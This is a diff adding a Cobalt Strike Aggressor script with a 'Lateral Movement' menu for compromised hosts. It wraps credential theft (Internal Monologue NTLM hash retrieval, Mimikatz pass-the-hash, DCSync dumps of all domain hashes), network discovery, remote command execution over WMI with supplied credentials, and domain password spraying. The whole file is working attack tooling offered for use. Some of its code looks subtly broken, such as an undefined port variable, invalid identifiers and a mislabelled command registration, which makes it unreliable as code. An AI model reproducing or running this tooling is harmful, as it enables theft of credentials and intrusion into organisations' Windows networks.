@@ -1,0 +1,155 @@
+##############################
+#                            #
+#                            #
+#                            #
+#       XWAY.CN@panda        #
+#                            #
+#                            #
+#                            #
+##############################
+	menu "Lateral Movement" {
+    	item "NTLM hash"{
+    		local('$bid');
+               foreach $bid ($1){
+                   internal_monologue($bid);
+            }
+    	}
+sub internal_monologue{
+	$binary = "script/InternalMonologue.exe";
+	$help = "Internal Monologue Attack: Retrieving NTLM Hashes without Touching LSASS";
+	beacon_command_register("lazagne", $help, "Internal Monologue Attack: Retrieving NTLM Hashes without Touching LSASS.\n\n$help");
+	if(!-exists $binary)
+	{
+		berror($1, "InternalMonologue binary cannot be found at $binary");
+		return;
+	}
+	$args = "-Downgrade True -Verbose True";
+	bexecute_assembly($1, $binary, $args);
+}		
+			item "SharpOXID-Find" {
+			$bid = $1['@'];
+			$dialog = dialog("SharpOXID-Find", %(ip => "192.168.1.1/24",bid => $bid), &SharpOXID-Find);
+			dialog_description($dialog, "OXID. -i IP ( -i 192.168.0.1 ). -c cidr (-c 192.168.0.1/24).");
+			drow_combobox($dialog, "type", "type:", @("-i","-c"));
+			drow_text($dialog, "ip", "ip:  ");			
+            dbutton_action($dialog, "RUN");
+			dialog_show($dialog);
+        }
+sub SharpOXID-Find {
+	$arg = join(' ',  @($3['type'],$3['ip']));
+	bexecute_assembly($bid, script_resource("/script/SharpOXID-Find.exe"), $arg);
+}		
+		item "SharpHound3.0" {
+			bexecute_assembly($1, script_resource("/script/SharpHound.exe"), "");
+		}
+
+
+    	item "Mimikatz-pth"{
+    		local('$bid');
+               foreach $bid ($1){
+                   mimikatz_passthehash($bid);
+            }
+    	}
+
+
+sub mimikatz_passthehash{
+	$bid = $1;
+	$dialog = dialog("Pass-The-Hash" , %(beacon => $1 , domain => "GLITTER" , user => "administrator" , hash => "hash") , 
+	lambda({
+		bpassthehash($3["beacon"] , $3["domain"] , $3["user"] , $3["hash"]);
+	}
+	)
+	);
+	dialog_description($dialog, "Ask Beacon to create a token that passes the specified hash. This is the pth command in Beacon. It uses mimikatz.");
+	drow_text($dialog, "beacon",  "Beacon:");
+	drow_text($dialog, "domain",  "Domain:");
+	drow_text($dialog, "user",  "User:");
+	drow_text($dialog, "hash",  "Hash:");
+	dbutton_action($dialog, "Launch");
+	dialog_show($dialog);
+}
+
+	    menu "sharpwmi" {
+			item "Upload sharpwmi" {
+				$bid = $1;
+				$dialog = dialog("Upload sharpwmi", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &sharpwmi_up);
+				drow_text($dialog, "UploadPath",  "UploadPath: "); 	
+				dbutton_action($dialog, "Upload");
+				dialog_show($dialog);
+        }
+sub sharpwmi_up {
+
+    bcd($bid, $3['UploadPath']);
+        bupload($bid, script_resource("/script/sharpwmi.exe"));
+    
+
+}
+                item "Run sharpwmi"{
+                    $bid = $1['@'];
+                    $Dialog = dialog("Run sharpwmi",%(ip => "127.0.0.1", username => "administrator", password => "password", type => "cmd or upload", cmd/path => "cmd or upload path",bid => $bid),&sharpwmi_run);
+                    dialog_description($Dialog, "Use port 139. Can upload files and exec by wmi. Files should be less than 512kb.");
+                    drow_text($Dialog, "ip", "ip: ");
+					drow_text($Dialog, "username", "username: ");
+					drow_text($Dialog, "password", "password: ");
+					drow_text($Dialog, "type", "cmd/upload: ");
+					drow_text($Dialog, "cmd/path", "cmd/path: ");
+                    dbutton_action($Dialog, "RUN");
+                    dialog_show($Dialog);
+                }
+
+sub sharpwmi_run{
+    local('$Name $username $password $type $cmd/path');
+    $Name = $3['ip'];
+	$username = $3['username'];
+	$password = $3['password'];
+	$type = $3['type'];
+	$cmd/path = $3['cmd/path'];
+	bshell($bid, "sharpwmi.exe  $+ $Name  $+ $port  $+ $username  $+ $password  $+ $type  $+ $cmd/path");
+} 
+        	item "Delete sharpwmi"{
+        	local('$bid');
+        	foreach $bid ($1){
+            	bshell($1, "del /f /s /q sharpwmi.exe");
+        	}
+		}
+}
+
+			item "SharpDomainSpray" {
+			$bid = $1['@'];
+			$dialog = dialog("SharpDomainSpray", %(content => "",bid => $bid), &SharpDomainSpray);
+			dialog_description($dialog, "Brute force passwd (Pass2User: specific passwd to burte username. User2Pass: specific username to get passwd) .");
+			drow_text($dialog, "content", "content:  ");		
+			drow_combobox($dialog, "type", "type", @("-User2Pass", "-Pass2User"));
+            dbutton_action($dialog, "RUN");
+			dialog_show($dialog);
+        }
+sub SharpDomainSpray {
+	$arg = join(' ', @($3['type'],$3['content']));
+	bexecute_assembly($bid, script_resource("/script/SharpDomainSpray/SharpDomainSpray.exe"), $arg);
+} 
+
+		 menu "Mimikatz-DCSync" {
+		 		item "Specific User" {
+		 			$dialog = dialog("DomainInfo" , %(bid => $1['@'] , domain => "Domain" , user => "User") , lambda({ bdcsync($3["bid"] , $3["domain"] , $3["user"]) }));
+		 			dialog_description($dialog,"Use Mimikatz to get Hash");
+		 			drow_text($dialog,"bid","Bid:");
+		 			drow_text($dialog,"domain","Domain:");
+		 			drow_text($dialog,"user","User:");
+		 			dbutton_action($dialog,"Exploit");
+		 			dialog_show($dialog);
+ 		 		}
+		 		item "All Users" {
+		 			$dialog = dialog("DomainInfo", %(bid => $1['@'] , domain => "Domain") , lambda({ bdcsync($3["bid"] , $3["domain"])}));
+		 			dialog_description($dialog, "Dump All Hash");
+		 			drow_text($dialog, "domain","Domain:");
+		 			dbutton_action($dialog,"Exploit");
+		 			dialog_show($dialog);
+
+		 		}
+		 }
+
+
+		
+		
+		
+		}
